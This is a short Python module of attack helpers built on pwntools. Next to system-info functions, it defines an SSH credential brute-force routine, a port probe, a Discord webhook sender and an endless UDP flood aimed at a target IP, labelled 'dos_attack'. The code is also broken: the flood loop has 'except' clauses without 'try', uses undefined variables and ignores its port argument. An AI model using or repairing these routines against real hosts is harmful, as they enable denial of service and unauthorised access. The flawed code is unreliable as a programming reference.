from subprocess import Popen
import platform, smtplib, requests, socket, random, datetime
from pwn import *

date = hora = datetime.datetime.now() 
hostname = socket.gethostname()
ip = socket.gethostbyname(hostname)
smtserver = smtplib.SMTP('smtp.gmail.com', 587)
smtserver.ehlo()
smtserver.starttls()
mydate = time.strftime('%Y-%m-%d') 
mytime = time.strftime('%H-%M') 
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)


def start_process(process):
  Popen(process)

def get_processor_name():
  print(platform.machine())

def get_processor_info():
  print(platform.processor())

def get_system():
  print(platform.system())

def get_ip():
  print(ip)

def get_hostname():
  print(hostname)

def get_date():
  print(date)

def smtp_login(email, password):
  smtserver.login(email, password)

def brute_ssh(host, user, password):
  try:
    ssh_connection = ssh(host, user, password)
    print(f'\n[-] Successful connection to {host}, {user}, {password}\n')

  except:
    print(f'\n[-] Conneciton failed to {host}, {user}, {password}\n')

def test_port(host, port):
  try:
    remote(host, port)
    print(f'\n[-] The port {port} of the IP {host} is opened\n')

  except:
    print(f'\n[-] The port {port} of the IP {host} is closed\n')

def get_status(url):
  response = requests.get(url)
  print(f'\n[-] Response code: {response.status_code}')
  print(f'[-] Code information: {response.reason}\n')

def discord_send_message(webhook, message):
  try:
    requests.post(webhook, json={'username': 'Zombiegeek0', 'content': mensaje})
    print('\n[-] Message sended\n')

  except:
    print('\n[-] Error: Message not sended\n')

def validate_ip(ip):
  try:
    print('\n')
    socket.inet_aton(ip)
    return True

  except:
    print('\n')
    return False

def dos_attack(ip, port):
  while True:
    print('\n')
    sock.sendto(bytes, (ip, 1))
    sent = sent + 1
    print(f"    | [ Sent Packet: {sent} through {ip}:{port} at time {date} ]")

    if port == 65534:
      port = 1

  except KeyboardInterrupt: 
       print(f'\n[-] Attack stopped to the IP {ip} in the port {port} at time {date}\n')

  except:
    print('\n[-] Error: The attack is stopped')
